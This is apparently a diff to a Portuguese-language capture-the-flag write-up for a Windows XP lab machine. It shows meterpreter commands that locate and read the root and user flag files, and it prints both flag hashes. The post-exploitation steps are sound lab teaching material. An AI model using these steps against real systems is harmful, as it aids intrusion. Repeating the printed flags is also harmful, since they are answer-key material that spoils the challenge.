@@ -244,3 +244,34 @@ Channel 1 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 ```
+
+## Search FLAG user e root
+
+Retornamos a nossa sessão do meterpreter e usando o **search -f** encontramos rápidamente as flags.
+```
+Terminate channel 1? [y/N]  y
+meterpreter > search -f root.txt
+Found 1 result...
+    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
+meterpreter > search -f user.txt
+Found 1 result...
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+```
+
+Agora podemos ler e submeter na plataforma
+
+```
+meterpreter > shell
+Process 1552 created.
+Channel 2 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>type "c:\Documents and Settings\Administrator\Desktop\root.txt"
+type "c:\Documents and Settings\Administrator\Desktop\root.txt"
+993442d258b0e0ec917cae9e695d5713
+C:\WINDOWS\system32>type "c:\Documents and Settings\john\Desktop\user.txt"
+type "c:\Documents and Settings\john\Desktop\user.txt"
+e69af0e4f443de7e36876fda4ec7644f
+C:\WINDOWS\system32>
+```
